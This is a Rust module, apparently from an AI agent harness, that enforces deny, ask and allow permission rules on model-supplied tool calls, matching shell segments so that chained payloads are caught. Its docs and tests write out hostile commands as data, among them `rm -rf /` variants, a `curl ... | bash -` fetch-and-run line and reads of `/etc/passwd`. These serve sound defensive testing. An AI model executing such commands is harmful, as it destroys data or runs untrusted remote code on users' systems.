//! Runtime evaluation of the [`PermissionSettings`] consent boundary.
//!
//! [`PermissionSettings`] holds the raw allow/deny/ask pattern strings
//! parsed, merged, and syntactically validated by the loader pipeline.
//! This module compiles those strings into a [`PermissionPolicy`] and
//! evaluates individual tool calls against it. The tool dispatch path
//! (`loop/tool_dispatch.rs`) retrieves the policy from the executor's
//! shared [`ToolContext`](crate::tool::context::ToolContext) extension
//! map and enforces the resulting [`PermissionDecision`] before a tool
//! executes.
//!
//! # Pattern grammar
//!
//! Each pattern is either a bare tool name or a tool name followed by a
//! parenthesised argument pattern:
//!
//! - `bash` — matches every call to the `bash` tool.
//! - `bash(rm *)` — matches calls to `bash` where a top-level string
//!   value (or, for deny/ask rules, any shell segment of one) is a
//!   whole-string wildcard match for `rm *`.
//! - `mcp__*` — wildcards (`*`) are accepted in the tool-name segment
//!   and match any (possibly empty) character sequence.
//!
//! The argument pattern is matched with the same `*` wildcard semantics
//! against every **top-level string value** of the call's model-supplied
//! arguments object (or against the whole argument when the arguments
//! are a bare string). A pattern must match the candidate string in its
//! entirety (anchored, not substring containment). `bash(rm *)`
//! therefore matches `{"command": "rm -rf /"}`, and `read(/etc/*)`
//! matches `{"path": "/etc/passwd"}`. Nested values are not inspected;
//! `?` and character classes are not supported.
//!
//! # Segment matching for deny / ask
//!
//! Restrictive rules (**deny** and **ask**) additionally match when any
//! *shell segment* of a candidate value matches the pattern, mirroring
//! the segmentation the advisory risk classifier
//! ([`crate::tool::risk`]) performs: the value is split at shell
//! separators (`;`, `&`, `|`, newlines, backticks, `$(...)`,
//! subshell/group parentheses and braces) and each segment is stripped
//! of leading `VAR=value` environment assignments and common wrapper
//! commands (`env`, `command`, `exec`, `nohup`, `time`) before
//! matching. `bash(rm *)` therefore also denies `ls; rm -rf /`,
//! `true && rm -rf /`, and `FOO=1 rm -rf /`. Quoting is intentionally
//! not parsed — separators inside quotes over-split, which for a
//! restrictive rule can only over-block, never under-block.
//!
//! Permissive **allow** rules are the conjunctive dual: a candidate is
//! covered only when **every** shell segment matches the pattern (and
//! segments are matched verbatim, without prefix stripping). Neither a
//! partial-segment match nor a `*` spanning a separator may widen what
//! an allow rule covers — `bash(ls *)` covers `ls -la` but never
//! `ls -la; rm -rf /`.
//!
//! # Precedence
//!
//! Evaluation order is **deny > ask > allow, first match wins** (the
//! order documented on [`PermissionSettings`]): a deny match hard-blocks
//! regardless of any allow or ask pattern, an ask match requires consent
//! unless a deny matched first, and an allow match short-circuits to
//! permit. A call matching no pattern at all is permitted — the
//! capability boundary (the profile tool allow-list) governs which tools
//! exist; permissions only impose additional deny/ask restrictions.

use std::collections::HashMap;

use serde_json::Value;
use thiserror::Error;

use super::types::PermissionSettings;

/// Syntactic defect in a permission pattern, produced by
/// `parse_permission_pattern` — the single grammar shared by
/// load-time validation ([`crate::config::validate::validate_settings`])
/// and rule compilation (`PermissionRule::parse`). Anything this parser
/// rejects would compile to a rule that can never match (an inert
/// tool-name literal), so it must be a typed error at the validation
/// boundary rather than a silently dead rule.
#[derive(Clone, Debug, PartialEq, Eq, Error)]
pub enum PermissionPatternError {
    /// The pattern is the empty string.
    #[error("empty string")]
    Empty,
    /// The pattern contains ASCII / Unicode control characters.
    #[error("contains control characters")]
    ControlCharacters,
    /// The pattern has leading or trailing whitespace — `bash(rm *) `
    /// would otherwise compile to a literal tool-name match that can
    /// never fire.
    #[error("has leading or trailing whitespace (an inert tool-name literal)")]
    SurroundingWhitespace,
    /// Parentheses do not balance.
    #[error("has unbalanced parentheses")]
    UnbalancedParentheses,
    /// The `name(args)` form does not end at the closing parenthesis.
    #[error("has text after the argument pattern's closing parenthesis")]
    TextAfterArgumentPattern,
    /// The `name(args)` form has an empty tool-name segment.
    #[error("has an empty tool-name segment before '('")]
    EmptyToolName,
    /// The `name(args)` form has an empty argument pattern.
    #[error("has an empty argument pattern between the parentheses")]
    EmptyArgumentPattern,
}

/// A permission pattern parsed into its tool-name and optional argument
/// segments. Produced by `parse_permission_pattern`.
#[derive(Clone, Debug, PartialEq, Eq)]
pub(crate) struct ParsedPermissionPattern {
    /// Wildcard pattern matched against the tool name.
    pub(crate) name_pattern: String,
    /// Wildcard pattern matched against argument values, when the
    /// pattern used the `name(args)` form.
    pub(crate) arg_pattern: Option<String>,
}

/// Parse a raw permission pattern into its segments, rejecting every
/// shape the matcher would treat as an inert literal.
///
/// This is the ONE pattern grammar: load-time validation and rule
/// compilation both call it, so a pattern that validates is guaranteed
/// to compile to exactly the rule the validator reasoned about.
///
/// # Errors
///
/// Returns [`PermissionPatternError`] for empty patterns, embedded
/// control characters, leading/trailing whitespace, unbalanced
/// parentheses, trailing text after the `name(args)` form's closing
/// parenthesis, and empty name / argument segments.
pub(crate) fn parse_permission_pattern(
    raw: &str,
) -> Result<ParsedPermissionPattern, PermissionPatternError> {
    if raw.is_empty() {
        return Err(PermissionPatternError::Empty);
    }
    if raw.chars().any(char::is_control) {
        return Err(PermissionPatternError::ControlCharacters);
    }
    if raw.trim() != raw {
        return Err(PermissionPatternError::SurroundingWhitespace);
    }
    let mut depth: u32 = 0;
    for ch in raw.chars() {
        match ch {
            '(' => depth += 1,
            ')' => {
                depth = depth
                    .checked_sub(1)
                    .ok_or(PermissionPatternError::UnbalancedParentheses)?;
            }
            _ => {}
        }
    }
    if depth != 0 {
        return Err(PermissionPatternError::UnbalancedParentheses);
    }
    let Some(open) = raw.find('(') else {
        return Ok(ParsedPermissionPattern {
            name_pattern: raw.to_owned(),
            arg_pattern: None,
        });
    };
    if !raw.ends_with(')') {
        return Err(PermissionPatternError::TextAfterArgumentPattern);
    }
    if open == 0 {
        return Err(PermissionPatternError::EmptyToolName);
    }
    let arg = &raw[open + 1..raw.len() - 1];
    if arg.is_empty() {
        return Err(PermissionPatternError::EmptyArgumentPattern);
    }
    Ok(ParsedPermissionPattern {
        name_pattern: raw[..open].to_owned(),
        arg_pattern: Some(arg.to_owned()),
    })
}

/// Outcome of evaluating one tool call against a [`PermissionPolicy`].
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum PermissionDecision {
    /// The call may execute (explicit allow match or no match at all).
    Allow,
    /// The call is hard-blocked by a deny pattern. Carries the matching
    /// pattern verbatim for the model-facing error message.
    Deny {
        /// The deny pattern that matched.
        rule: String,
    },
    /// The call requires operator consent per an ask pattern. Carries
    /// the matching pattern verbatim. The dispatch layer decides how to
    /// obtain consent: when a `PreToolHook` is registered it acts as the
    /// decision mechanism (a `Block` outcome refuses, anything else is
    /// taken as consent); with no hook available the call is blocked
    /// with a "requires consent; no interactive handler" error.
    Ask {
        /// The ask pattern that matched.
        rule: String,
    },
}

/// One compiled permission rule: a tool-name pattern and an optional
/// argument pattern (the parenthesised suffix).
#[derive(Clone, Debug)]
struct PermissionRule {
    /// The raw pattern as written in settings, for error messages.
    raw: String,
    /// Wildcard pattern matched against the tool name.
    name_pattern: String,
    /// Wildcard pattern matched against the call's top-level string
    /// argument values, when the rule used the `name(args)` form.
    arg_pattern: Option<String>,
}

impl PermissionRule {
    /// Compile a raw pattern string via `parse_permission_pattern` —
    /// the same grammar load-time validation applies, so a validated
    /// pattern always compiles to the rule the validator reasoned about.
    ///
    /// Settings-sourced patterns cannot reach the error arm: they are
    /// rejected by [`crate::config::validate::validate_settings`] before
    /// compilation. Directly-constructed policies
    /// ([`PermissionPolicy::from_patterns`]) that bypass validation fall
    /// back to a literal tool-name match, logged at `error` level so the
    /// dead rule is never silent.
    fn parse(raw: &str) -> Self {
        match parse_permission_pattern(raw) {
            Ok(parsed) => Self {
                raw: raw.to_owned(),
                name_pattern: parsed.name_pattern,
                arg_pattern: parsed.arg_pattern,
            },
            Err(err) => {
                tracing::error!(
                    pattern = raw,
                    error = %err,
                    "malformed permission pattern reached rule compilation; \
                     matching it as a literal tool name",
                );
                Self {
                    raw: raw.to_owned(),
                    name_pattern: raw.to_owned(),
                    arg_pattern: None,
                }
            }
        }
    }

    /// Returns `true` when this rule matches the given call under `scope`.
    fn matches(&self, tool_name: &str, args: &Value, scope: MatchScope) -> bool {
        if !wildcard_match(&self.name_pattern, tool_name) {
            return false;
        }
        let Some(arg_pattern) = self.arg_pattern.as_deref() else {
            return true;
        };
        argument_candidates(args)
            .iter()
            .any(|candidate| candidate_matches(arg_pattern, candidate, scope))
    }
}

/// How a rule's argument pattern is applied to a candidate string.
///
/// Restrictive lists (deny / ask) use [`Self::AnySegment`] so a
/// dangerous payload cannot hide behind a harmless chained prefix; the
/// permissive allow list uses [`Self::AllSegments`] so neither a
/// partial-segment match nor a `*` spanning a separator (`ls *` would
/// otherwise glob-match the whole of `ls -la; rm -rf /`) can widen an
/// allow rule. See the module docs ("Segment matching for deny / ask").
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum MatchScope {
    /// Every shell segment of the candidate must match the pattern (and
    /// at least one segment must exist). Segments are matched verbatim —
    /// no env-assignment / wrapper stripping, which would only *widen* a
    /// permissive rule.
    AllSegments,
    /// The pattern matches the entire value **or** any shell segment of
    /// it (after env-assignment / wrapper-command stripping).
    AnySegment,
}

/// Apply `pattern` to `candidate` under `scope`.
fn candidate_matches(pattern: &str, candidate: &str, scope: MatchScope) -> bool {
    match scope {
        MatchScope::AnySegment => {
            wildcard_match(pattern, candidate)
                || shell_segments(candidate).any(|segment| {
                    strip_command_prefixes(segment)
                        .is_some_and(|stripped| wildcard_match(pattern, stripped))
                })
        }
        MatchScope::AllSegments => {
            let mut saw_segment = false;
            for segment in shell_segments(candidate) {
                saw_segment = true;
                if !wildcard_match(pattern, segment) {
                    return false;
                }
            }
            saw_segment
        }
    }
}

/// Split a candidate string at shell separators: `;`, `&`, `|` (covering
/// `&&` and `||`), newlines, backticks, `$(`, and grouping
/// parentheses/braces. Mirrors the segmentation of the advisory risk
/// classifier (`crate::tool::risk::split_shell_segments`); quoting is
/// intentionally ignored — over-splitting can only over-block a
/// restrictive rule. Returns trimmed, non-empty segments.
fn shell_segments(text: &str) -> impl Iterator<Item = &str> {
    text.split([';', '&', '|', '\n', '`', '(', ')', '{', '}'])
        .map(str::trim)
        .map(|s| s.strip_prefix('$').map_or(s, str::trim_start))
        .filter(|s| !s.is_empty())
}

/// Strip leading `VAR=value` environment assignments and common wrapper
/// commands (`env`, `command`, `exec`, `nohup`, `time`) so the real
/// command is matched (`FOO=1 rm -rf /` → `rm -rf /`). Mirrors the
/// advisory classifier's `strip_command_prefixes`. Returns `None` when
/// nothing executable remains.
fn strip_command_prefixes(segment: &str) -> Option<&str> {
    let mut rest = segment.trim_start();
    loop {
        let token = rest.split_whitespace().next()?;
        let is_env_assignment = token.split_once('=').is_some_and(|(name, _)| {
            !name.is_empty()
                && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
                && !name.starts_with(|c: char| c.is_ascii_digit())
        });
        let is_wrapper = matches!(token, "env" | "command" | "exec" | "nohup" | "time");
        if !is_env_assignment && !is_wrapper {
            return Some(rest);
        }
        rest = rest[token.len()..].trim_start();
        if rest.is_empty() {
            return None;
        }
    }
}

/// Compiled, evaluable form of [`PermissionSettings`].
///
/// Constructed once at runtime assembly (the CLI installs it on the
/// tool registry's shared [`ToolContext`](crate::tool::context::ToolContext)
/// as an extension) and consulted by tool dispatch before every tool
/// execution. See the module docs for grammar and precedence.
#[derive(Clone, Debug, Default)]
pub struct PermissionPolicy {
    deny: Vec<PermissionRule>,
    ask: Vec<PermissionRule>,
    allow: Vec<PermissionRule>,
}

impl PermissionPolicy {
    /// Compile a policy from raw [`PermissionSettings`] patterns.
    #[must_use]
    pub fn from_settings(settings: &PermissionSettings) -> Self {
        fn compile(list: Option<&Vec<String>>) -> Vec<PermissionRule> {
            list.map(Vec::as_slice)
                .unwrap_or_default()
                .iter()
                .map(|raw| PermissionRule::parse(raw))
                .collect()
        }
        Self {
            deny: compile(settings.deny.as_ref()),
            ask: compile(settings.ask.as_ref()),
            allow: compile(settings.allow.as_ref()),
        }
    }

    /// Returns `true` when no rule is configured in any list — an empty
    /// policy permits everything and need not be installed at all.
    #[must_use]
    pub fn is_empty(&self) -> bool {
        self.deny.is_empty() && self.ask.is_empty() && self.allow.is_empty()
    }

    /// Return a copy of this policy with `patterns` appended to the deny
    /// list. Used to fold profile / capability `disallowedTools` patterns
    /// into the consent boundary: deny is additive (CO6 — a restriction
    /// can only ever be widened, never removed, by a later source).
    #[must_use]
    pub fn with_additional_deny(&self, patterns: &[String]) -> Self {
        let mut merged = self.clone();
        merged
            .deny
            .extend(patterns.iter().map(|raw| PermissionRule::parse(raw)));
        merged
    }

    /// Evaluate a tool call against the policy.
    ///
    /// `args` are the model-supplied tool arguments (after envelope
    /// metadata has been split off). Precedence is deny > ask > allow,
    /// first match wins; a call matching nothing yields
    /// [`PermissionDecision::Allow`]. Deny and ask rules match whole
    /// values **or any shell segment** of them; allow rules match whole
    /// values only (see the module docs).
    #[must_use]
    pub fn evaluate(&self, tool_name: &str, args: &Value) -> PermissionDecision {
        if let Some(rule) = first_match(&self.deny, tool_name, args, MatchScope::AnySegment) {
            return PermissionDecision::Deny {
                rule: rule.raw.clone(),
            };
        }
        if let Some(rule) = first_match(&self.ask, tool_name, args, MatchScope::AnySegment) {
            return PermissionDecision::Ask {
                rule: rule.raw.clone(),
            };
        }
        // Allow matches and unmatched calls both proceed; the explicit
        // allow list exists to short-circuit future prompting surfaces
        // (which consult it via [`Self::explicitly_allowed`]).
        PermissionDecision::Allow
    }

    /// Returns `true` when an allow rule explicitly covers the call.
    ///
    /// This is the query a prompting surface uses to short-circuit
    /// consent for pre-approved calls. Allow rules are permissive, so a
    /// candidate is covered only when **every** shell segment of it
    /// matches the pattern — `bash(ls *)` covers `ls -la` but never
    /// `ls; rm -rf /` (which a whole-value glob would otherwise match,
    /// `*` spanning the separator). Deny precedence is the caller's
    /// responsibility: [`Self::evaluate`] always checks deny and ask
    /// first.
    #[must_use]
    pub fn explicitly_allowed(&self, tool_name: &str, args: &Value) -> bool {
        first_match(&self.allow, tool_name, args, MatchScope::AllSegments).is_some()
    }
}

fn first_match<'a>(
    rules: &'a [PermissionRule],
    tool_name: &str,
    args: &Value,
    scope: MatchScope,
) -> Option<&'a PermissionRule> {
    rules
        .iter()
        .find(|rule| rule.matches(tool_name, args, scope))
}

/// Collect the strings an argument pattern is matched against: every
/// top-level string value when `args` is an object, or the value itself
/// when it is a bare string. Other shapes yield no candidates.
fn argument_candidates(args: &Value) -> Vec<&str> {
    match args {
        Value::Object(map) => map.values().filter_map(Value::as_str).collect(),
        Value::String(s) => vec![s.as_str()],
        Value::Null | Value::Bool(_) | Value::Number(_) | Value::Array(_) => Vec::new(),
    }
}

/// Match `text` against `pattern` where `*` matches any (possibly empty)
/// sequence of characters and every other character matches literally.
///
/// Iterative two-pointer algorithm with backtracking over the last `*`;
/// linear in `text.len() * pattern.len()` worst case, no allocation
/// beyond the char buffers.
fn wildcard_match(pattern: &str, text: &str) -> bool {
    let p: Vec<char> = pattern.chars().collect();
    let t: Vec<char> = text.chars().collect();
    let mut pi = 0usize;
    let mut ti = 0usize;
    let mut star: Option<usize> = None;
    let mut mark = 0usize;

    while ti < t.len() {
        if pi < p.len() && p[pi] != '*' && p[pi] == t[ti] {
            pi += 1;
            ti += 1;
        } else if pi < p.len() && p[pi] == '*' {
            star = Some(pi);
            mark = ti;
            pi += 1;
        } else if let Some(s) = star {
            pi = s + 1;
            mark += 1;
            ti = mark;
        } else {
            return false;
        }
    }
    while pi < p.len() && p[pi] == '*' {
        pi += 1;
    }
    pi == p.len()
}

/// Convenience constructor used by tests and embedders: build a policy
/// from plain pattern lists without going through [`PermissionSettings`].
impl PermissionPolicy {
    /// Build a policy directly from pattern lists (deny, ask, allow).
    #[must_use]
    pub fn from_patterns(deny: &[&str], ask: &[&str], allow: &[&str]) -> Self {
        fn compile(list: &[&str]) -> Vec<PermissionRule> {
            list.iter().map(|raw| PermissionRule::parse(raw)).collect()
        }
        Self {
            deny: compile(deny),
            ask: compile(ask),
            allow: compile(allow),
        }
    }

    /// Diagnostic summary: number of rules per list, keyed `deny` /
    /// `ask` / `allow`. Used by logging at policy-install time.
    #[must_use]
    pub fn rule_counts(&self) -> HashMap<&'static str, usize> {
        HashMap::from([
            ("deny", self.deny.len()),
            ("ask", self.ask.len()),
            ("allow", self.allow.len()),
        ])
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod tests {
    use serde_json::json;

    use super::*;

    #[test]
    fn wildcard_literal_and_star() {
        assert!(wildcard_match("bash", "bash"));
        assert!(!wildcard_match("bash", "bash2"));
        assert!(wildcard_match("rm *", "rm -rf /"));
        assert!(!wildcard_match("rm *", "echo rm"));
        assert!(wildcard_match("*", "anything"));
        assert!(wildcard_match("*", ""));
        assert!(wildcard_match("mcp__*", "mcp__github_search"));
        assert!(wildcard_match("a*c", "abc"));
        assert!(wildcard_match("a*c", "ac"));
        assert!(!wildcard_match("a*c", "ab"));
    }

    #[test]
    fn bare_name_matches_any_args() {
        let policy = PermissionPolicy::from_patterns(&["bash"], &[], &[]);
        assert_eq!(
            policy.evaluate("bash", &json!({"command": "ls"})),
            PermissionDecision::Deny {
                rule: "bash".to_owned()
            },
        );
        assert_eq!(
            policy.evaluate("read", &json!({"path": "x"})),
            PermissionDecision::Allow,
        );
    }

    #[test]
    fn argument_pattern_matches_top_level_string_values() {
        let policy = PermissionPolicy::from_patterns(&["bash(rm *)"], &[], &[]);
        assert_eq!(
            policy.evaluate("bash", &json!({"command": "rm -rf /tmp/x"})),
            PermissionDecision::Deny {
                rule: "bash(rm *)".to_owned()
            },
        );
        assert_eq!(
            policy.evaluate("bash", &json!({"command": "git status"})),
            PermissionDecision::Allow,
        );
        // Nested strings are not inspected.
        assert_eq!(
            policy.evaluate("bash", &json!({"nested": {"command": "rm -rf /"}})),
            PermissionDecision::Allow,
        );
    }

    #[test]
    fn deny_beats_ask_beats_allow() {
        let policy = PermissionPolicy::from_patterns(&["bash"], &["bash"], &["bash"]);
        assert!(matches!(
            policy.evaluate("bash", &json!({})),
            PermissionDecision::Deny { .. }
        ));

        let policy = PermissionPolicy::from_patterns(&[], &["bash"], &["bash"]);
        assert!(matches!(
            policy.evaluate("bash", &json!({})),
            PermissionDecision::Ask { .. }
        ));

        let policy = PermissionPolicy::from_patterns(&[], &[], &["bash"]);
        assert_eq!(
            policy.evaluate("bash", &json!({})),
            PermissionDecision::Allow
        );
    }

    #[test]
    fn unmatched_call_is_allowed() {
        let policy = PermissionPolicy::from_patterns(&["write"], &["edit"], &[]);
        assert_eq!(
            policy.evaluate("read", &json!({"path": "a"})),
            PermissionDecision::Allow,
        );
    }

    #[test]
    fn from_settings_compiles_all_lists() {
        let settings = PermissionSettings {
            allow: Some(vec!["read".to_owned()]),
            deny: Some(vec!["bash(rm *)".to_owned()]),
            ask: Some(vec!["write".to_owned()]),
        };
        let policy = PermissionPolicy::from_settings(&settings);
        assert!(!policy.is_empty());
        assert_eq!(policy.rule_counts()["deny"], 1);
        assert_eq!(policy.rule_counts()["ask"], 1);
        assert_eq!(policy.rule_counts()["allow"], 1);
        assert!(matches!(
            policy.evaluate("bash", &json!({"command": "rm -r x"})),
            PermissionDecision::Deny { .. }
        ));
    }

    #[test]
    fn empty_settings_yield_empty_policy() {
        let policy = PermissionPolicy::from_settings(&PermissionSettings::default());
        assert!(policy.is_empty());
        assert_eq!(
            policy.evaluate("bash", &json!({})),
            PermissionDecision::Allow
        );
    }

    #[test]
    fn string_args_match_directly() {
        let policy = PermissionPolicy::from_patterns(&["bash(rm *)"], &[], &[]);
        assert!(matches!(
            policy.evaluate("bash", &json!("rm -rf /")),
            PermissionDecision::Deny { .. }
        ));
    }

    // --- Segment-matching regressions ----------------------------------
    // The enforcing matcher historically did an anchored whole-string glob
    // only, so a harmless prefix hid the denied payload — strictly weaker
    // than the advisory risk classifier (`crate::tool::risk`), which
    // segments command strings. A deny/ask rule must match when ANY shell
    // segment matches.

    #[test]
    fn deny_matches_semicolon_chained_segment() {
        let policy = PermissionPolicy::from_patterns(&["bash(rm *)"], &[], &[]);
        assert_eq!(
            policy.evaluate("bash", &json!({"command": "ls; rm -rf /"})),
            PermissionDecision::Deny {
                rule: "bash(rm *)".to_owned()
            },
        );
    }

    #[test]
    fn deny_matches_and_or_chained_segment() {
        let policy = PermissionPolicy::from_patterns(&["bash(rm *)"], &[], &[]);
        assert_eq!(
            policy.evaluate("bash", &json!({"command": "true && rm -rf /"})),
            PermissionDecision::Deny {
                rule: "bash(rm *)".to_owned()
            },
        );
        assert_eq!(
            policy.evaluate("bash", &json!({"command": "echo hi || rm -rf /"})),
            PermissionDecision::Deny {
                rule: "bash(rm *)".to_owned()
            },
        );
    }

    #[test]
    fn deny_matches_env_prefixed_segment() {
        let policy = PermissionPolicy::from_patterns(&["bash(rm *)"], &[], &[]);
        assert_eq!(
            policy.evaluate("bash", &json!({"command": "FOO=1 rm -rf /"})),
            PermissionDecision::Deny {
                rule: "bash(rm *)".to_owned()
            },
        );
        assert_eq!(
            policy.evaluate("bash", &json!({"command": "LANG=C LC_ALL=C rm -rf /tmp/z"})),
            PermissionDecision::Deny {
                rule: "bash(rm *)".to_owned()
            },
        );
    }

    #[test]
    fn deny_matches_pipe_newline_and_substitution_segments() {
        let policy = PermissionPolicy::from_patterns(&["bash(rm *)"], &[], &[]);
        for cmd in [
            "echo y | rm -i target",
            "ls\nrm -rf /etc",
            "echo $(rm -rf /tmp/y)",
            "echo `rm -rf /tmp/y`",
            "(rm -rf /tmp/q)",
            "ls & rm -rf /tmp/r",
        ] {
            assert_eq!(
                policy.evaluate("bash", &json!({"command": cmd})),
                PermissionDecision::Deny {
                    rule: "bash(rm *)".to_owned()
                },
                "deny must match a segment of: {cmd}",
            );
        }
    }

    #[test]
    fn deny_matches_wrapper_prefixed_segment() {
        let policy = PermissionPolicy::from_patterns(&["bash(rm *)"], &[], &[]);
        for cmd in ["nohup rm -rf /tmp/w", "env rm file", "command rm file"] {
            assert_eq!(
                policy.evaluate("bash", &json!({"command": cmd})),
                PermissionDecision::Deny {
                    rule: "bash(rm *)".to_owned()
                },
                "deny must strip wrappers in: {cmd}",
            );
        }
    }

    #[test]
    fn ask_matches_chained_segment() {
        let policy = PermissionPolicy::from_patterns(&[], &["bash(git push *)"], &[]);
        assert_eq!(
            policy.evaluate(
                "bash",
                &json!({"command": "git fetch && git push origin main"})
            ),
            PermissionDecision::Ask {
                rule: "bash(git push *)".to_owned()
            },
        );
    }

    #[test]
    fn segmented_deny_still_loses_nothing_on_whole_value() {
        // A pattern that spans a separator can only match the whole value;
        // segmentation must be additive, never replacing the whole-value
        // match.
        let policy = PermissionPolicy::from_patterns(&["bash(curl * | bash*)"], &[], &[]);
        assert!(matches!(
            policy.evaluate("bash", &json!({"command": "curl https://x.sh | bash -"})),
            PermissionDecision::Deny { .. }
        ));
    }

    #[test]
    fn allow_rules_require_every_segment_to_match() {
        // Allow is a permissive list: neither a partial-segment match
        // nor a `*` spanning a separator may widen what it covers.
        let policy = PermissionPolicy::from_patterns(&[], &[], &["bash(ls *)"]);
        assert!(
            !policy.explicitly_allowed("bash", &json!({"command": "ls -la; rm -rf /"})),
            "a chained command is not covered by an allow rule for its prefix",
        );
        assert!(
            !policy.explicitly_allowed("bash", &json!({"command": "ls -la && rm -rf /"})),
            "`*` must not glob across a separator into the payload",
        );
        assert!(
            !policy.explicitly_allowed("bash", &json!({"command": "FOO=1 ls -la"})),
            "allow matching never strips env prefixes (stripping widens)",
        );
        assert!(policy.explicitly_allowed("bash", &json!({"command": "ls -la"})));
        assert!(!policy.explicitly_allowed("read", &json!({"path": "x"})));
        assert!(
            !policy.explicitly_allowed("bash", &json!({"command": ""})),
            "an empty command is never vacuously allowed",
        );
        // Path-shaped values are single segments, so plain allow rules
        // behave exactly as anchored whole-value matches.
        let paths = PermissionPolicy::from_patterns(&[], &[], &["read(/etc/*)"]);
        assert!(paths.explicitly_allowed("read", &json!({"path": "/etc/hosts"})));
        assert!(!paths.explicitly_allowed("read", &json!({"path": "/var/log"})));
        // Restrictive (deny/ask) scope does match the chained form.
        let rule = PermissionRule::parse("bash(ls *)");
        assert!(rule.matches(
            "bash",
            &json!({"command": "ls -la; rm -rf /"}),
            MatchScope::AnySegment
        ));
    }

    #[test]
    fn deny_does_not_overmatch_unrelated_chains() {
        let policy = PermissionPolicy::from_patterns(&["bash(rm *)"], &[], &[]);
        assert_eq!(
            policy.evaluate("bash", &json!({"command": "git status && cargo test"})),
            PermissionDecision::Allow,
        );
        assert_eq!(
            policy.evaluate("bash", &json!({"command": "echo rm"})),
            PermissionDecision::Allow,
            "a non-leading 'rm' token inside one segment is not an rm command",
        );
    }

    // --- Shared pattern grammar (validation == enforcement) -------------

    #[test]
    fn parse_permission_pattern_accepts_the_documented_grammar() {
        let bare = parse_permission_pattern("bash").unwrap();
        assert_eq!(bare.name_pattern, "bash");
        assert_eq!(bare.arg_pattern, None);

        let args = parse_permission_pattern("bash(rm *)").unwrap();
        assert_eq!(args.name_pattern, "bash");
        assert_eq!(args.arg_pattern.as_deref(), Some("rm *"));

        let family = parse_permission_pattern("mcp__*").unwrap();
        assert_eq!(family.name_pattern, "mcp__*");

        let nested = parse_permission_pattern("bash(echo (hi))").unwrap();
        assert_eq!(nested.arg_pattern.as_deref(), Some("echo (hi)"));
    }

    /// The review's exact reproduction: a trailing space after the
    /// closing paren used to validate cleanly and then compile to an
    /// inert tool-name literal. The shared grammar rejects it.
    #[test]
    fn parse_permission_pattern_rejects_trailing_space_after_paren() {
        assert_eq!(
            parse_permission_pattern("bash(rm *) "),
            Err(PermissionPatternError::SurroundingWhitespace),
        );
    }

    #[test]
    fn parse_permission_pattern_rejects_inert_shapes() {
        assert_eq!(
            parse_permission_pattern(""),
            Err(PermissionPatternError::Empty),
        );
        assert_eq!(
            parse_permission_pattern("bash(\u{0007}x)"),
            Err(PermissionPatternError::ControlCharacters),
        );
        assert_eq!(
            parse_permission_pattern(" bash"),
            Err(PermissionPatternError::SurroundingWhitespace),
        );
        assert_eq!(
            parse_permission_pattern("bash(rm -rf"),
            Err(PermissionPatternError::UnbalancedParentheses),
        );
        assert_eq!(
            parse_permission_pattern("bash)oops("),
            Err(PermissionPatternError::UnbalancedParentheses),
        );
        assert_eq!(
            parse_permission_pattern("bash(x)y"),
            Err(PermissionPatternError::TextAfterArgumentPattern),
        );
        assert_eq!(
            parse_permission_pattern("(x)"),
            Err(PermissionPatternError::EmptyToolName),
        );
        assert_eq!(
            parse_permission_pattern("bash()"),
            Err(PermissionPatternError::EmptyArgumentPattern),
        );
    }

    #[test]
    fn wildcard_tool_name_matches_family() {
        let policy = PermissionPolicy::from_patterns(&["mcp__*"], &[], &[]);
        assert!(matches!(
            policy.evaluate("mcp__github_search", &json!({})),
            PermissionDecision::Deny { .. }
        ));
        assert_eq!(
            policy.evaluate("read", &json!({})),
            PermissionDecision::Allow
        );
    }
}
